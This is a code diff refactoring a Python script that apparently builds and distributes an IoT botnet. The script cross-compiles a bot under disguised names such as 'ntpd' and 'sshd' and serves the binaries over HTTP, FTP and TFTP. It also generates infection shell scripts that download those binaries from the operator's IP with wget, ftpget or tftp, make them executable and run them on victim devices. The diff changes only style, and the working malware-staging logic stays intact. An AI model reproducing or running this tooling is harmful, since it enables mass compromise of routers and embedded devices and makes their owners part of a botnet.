@@ -12,11 +12,7 @@ else:
 bot = sys.argv[1]
 
 yourafag = raw_input("Get arch's? Y/n:")
-if yourafag.lower() == "y":
-    get_arch = True
-else:
-    get_arch = False
-
+get_arch = yourafag.lower() == "y"
 compileas = ["ntpd", #mips
              "sshd", #mipsel
              "openssh", #sh4
@@ -70,18 +66,17 @@ if get_arch == True:
     print("Downloading Architectures")
 
     for arch in getarch:
-        run("wget " + arch + " --no-check-certificate >> /dev/null")
+        run(f"wget {arch} --no-check-certificate >> /dev/null")
         run("tar -xvf *tar.bz2")
         run("rm -rf *tar.bz2")
 
     print("Cross Compilers Downloaded...")
 
-num = 0
-for cc in ccs:
+for num, cc in enumerate(ccs):
     arch = cc.split("-")[2]
-    run("./"+cc+"/bin/"+arch+"-gcc -static -pthread -D" + arch.upper() + " -o " + compileas[num] + " " + bot + " > /dev/null")
-    num += 1
-
+    run(
+        f"./{cc}/bin/{arch}-gcc -static -pthread -D{arch.upper()} -o {compileas[num]} {bot} > /dev/null"
+    )
 print("Cross Compiling Done!")
 print("Setting up your httpd and tftp")
 
@@ -124,9 +119,9 @@ listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
 run("service vsftpd restart")
 
 for i in compileas:
-    run("cp " + i + " /var/www/html")
-    run("cp " + i + " /var/ftp")
-    run("mv " + i + " /var/lib/tftpboot")
+    run(f"cp {i} /var/www/html")
+    run(f"cp {i} /var/ftp")
+    run(f"mv {i} /var/lib/tftpboot")
 
 run('echo -e "#!/bin/bash" > /var/lib/tftpboot/tftp1.sh')
 
@@ -143,10 +138,18 @@ run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp2.sh')
 run('echo -e "#!/bin/bash" > /var/www/html/bins.sh')
 
 for i in compileas:
-    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/bins.sh')
-    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' ' + i + ' ' + i + '; chmod 777 ' + i + ' ./' + i + '; rm -rf ' + i + '" >> /var/ftp/ftp1.sh')
-    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1.sh')
-    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' + i + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp2.sh')
+    run(
+        f'echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://{ip}/{i}; chmod +x {i}; ./{i}; rm -rf {i}" >> /var/www/html/bins.sh'
+    )
+    run(
+        f'echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 {ip} {i} {i}; chmod 777 {i} ./{i}; rm -rf {i}" >> /var/ftp/ftp1.sh'
+    )
+    run(
+        f'echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp {ip} -c get {i};cat {i} >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1.sh'
+    )
+    run(
+        f'echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r {i} -g {ip};cat {i} >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp2.sh'
+    )
 
 run("service xinetd restart")
 run("service httpd restart")
